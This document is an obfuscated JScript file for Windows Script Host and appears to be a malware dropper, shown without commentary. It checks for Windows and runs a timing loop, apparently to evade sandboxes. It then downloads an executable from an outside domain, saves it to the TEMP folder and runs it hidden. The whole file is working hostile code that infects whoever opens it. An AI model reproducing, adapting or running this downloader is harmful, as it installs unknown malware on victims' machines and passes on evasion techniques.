var N = false;
var mx = "CreateObject";
var P = function y() {return WScript[mx]("WScript.Shell");}(), Fv = 11;
var h = "MSXML2.XMLHTTP";
var SW = 2123213;
var ym = 0;
function kC(xD){P["Run"](xD, ym, ym);};
function IB(){return "" + h;};
function Wc(q, sE){ym = ym * 1; return q - sE;};
function O(){return mx;};
/*@cc_on
  @if (@_win32 || @_win64)
    N = true;
  @end
@*/
if (N)
{
var k = "";
function r(){return 22;};
var b0 = 0; var zK = 0;
function K()
{
var id = new this["Date"]();
var gs = id["getUTCMilliseconds"]();
WScript["Sleep"](r());
var id = new this["Date"]();
var MH = id["getUTCMilliseconds"]();
WScript["Sleep"](r());
var id = new this["Date"]();
var JF = id["getUTCMilliseconds"]();
var b0 = "o";
b0 = Wc(MH, gs);
var zK = "px";
zK = Wc(JF, MH);
k = "open";
return Wc(b0, zK);
}
var kP = false;
var Z = false;
for (var So = ym; So < r() * 1; So++){if (K() != ym){
kP = true; 
zK = "31" + 11 * b0 + zK; 
Z = true; 
break;
}}
function j() {return ((kP == true) && (kP == Z)) ? 1 : ym;};
if (kP && j() && Z){
function dF() {return P["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "I3dCBIOG4QDr77.exe";};
 OE = IB();
 kT = WScript[mx](OE);
 var x = 1;
 while (x){
try {
kT[k]("GET", "http://xn--kandypriv-j4a.com/lo4sad", false);
kT["send"]();
b = "Sleep";
for (;;){WScript[b](r() * 11); if (kT["readystate"] >= 2 * 2) break;};
x = ym;
} catch(F){};
}
function Y(WO) {var M = (1, 2, 3, 4, 5, WO); return M;};
I = WScript[O()]("ADODB.Stream");
OE = I;
OE[k]();
OE["type"] = Y(1);
OE["write"](kT["ResponseBody"]);
I["position"] = Y(ym);
OE["Save" + "ToFile"](dF(), 2);
I["c"+"lose"]();
md = dF();
kC(md);
}
}

